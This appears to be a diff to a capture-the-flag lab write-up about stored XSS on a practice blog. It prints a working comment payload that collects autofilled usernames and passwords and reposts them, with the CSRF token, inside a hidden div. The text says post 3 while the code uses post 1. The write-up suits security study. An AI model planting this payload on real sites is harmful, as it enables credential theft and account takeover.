@@ -100,5 +100,22 @@ Following you can find a useful link about Postgresql system queries: https://ra
 This is actually a funny and a challenging lab. Taking advantage of a XSS stored vulnerability we have to access the blog as administrator user. We know that the comment field is injectable, lets analyze the flow:
 <br>![img](./img/33.png)<br>
 
-First of all I thought to use the classic approach: stealing authentication cookie
-
+First of all I thought to use the classic approach: stealing authentication cookie, but since the lab's cookie is HttpOnly we cannot access it through JS:
+<br>![img](./img/34.png)<br>
+Reading some hints we knew that if we set 2 inputs fields (username and password) in the comments of a post they will be filled automatically by the lab system before to execute our payload. Since my Burp version is Community I even cannot use Burp Collaborator, so the scenario I set it is to craft a payload that will submit a new comment containing the username and password collected whene a user (in this scenario of course this event is automated) visit the infected post. Following is the payload we will use in the comment field:
+```
+Username<input name=username id=username>
+Password<input type=password id=password name=password onchange="pwn_usr()">
+<script>
+function pwn_usr() {
+ var labId= '0aca008b0490873dc0c3c76000c0002a'; 
+ var csrf = document.getElementsByName("csrf")[0].value;
+ var secret_ = document.getElementById("username").value + ':' + document.getElementById("password").value;
+ fetch('https://' + labId + '.web-security-academy.net/post/comment', {
+   method: 'POST',
+   body: 'csrf=' + csrf + '&postId=1&comment=This is amazing!<div style=visibility:hidden>' + secret_ + '</div>&name=zinzloun&email=zinzloun@libero.it&website='
+  });
+ };
+</script>
+```
+When the password field is compiled the pwn_usr function is invoked, the function will create a new comment in the post with ID 3. Here we use the fetch JS API (https://www.w3schools.com/jsref/api_fetch.asp, remember that fetch is not supported in Internet Explorer 11 and earlier), to make the things a little bit obfuscated we will save the credentials in hidden div.
